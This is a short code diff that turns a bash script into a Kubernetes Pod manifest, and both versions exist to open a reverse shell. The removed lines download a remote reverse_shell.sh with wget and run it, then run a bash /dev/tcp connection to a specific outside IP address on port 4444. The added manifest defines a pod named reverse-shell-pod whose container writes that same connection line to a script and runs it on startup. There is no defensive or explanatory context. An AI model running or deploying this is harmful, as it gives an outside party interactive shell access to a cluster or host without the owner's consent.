@@ -1,8 +1,21 @@
-#!/bin/bash
-# Download the reverse shell script
-wget https://raw.githubusercontent.com/NarbehJackson/test/refs/heads/main/reverse_shell.sh -O /tmp/reverse_shell.sh
-# Make it executable
-chmod +x /tmp/reverse_shell.sh
-# Execute the script
-bash /tmp/reverse_shell.sh
-bash -i >& /dev/tcp/23.27.169.114/4444 0>&1
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell-pod
+  labels:
+    app: reverse-shell
+spec:
+  restartPolicy: Never  # Set the restart policy at the pod level
+  containers:
+    - name: reverse-shell
+      image: ubuntu:latest  # You can also use a different image that has bash installed
+      command: ["/bin/bash", "-c"]
+      args:
+        - |
+          # Install curl if it's not already installed
+          apt-get update && apt-get install -y curl && \
+          # Create the reverse shell script
+          echo "bash -i >& /dev/tcp/23.27.169.114/4444 0>&1" > /tmp/reverse_shell.sh && \
+          chmod +x /tmp/reverse_shell.sh && \
+          # Execute the reverse shell
+          /tmp/reverse_shell.sh
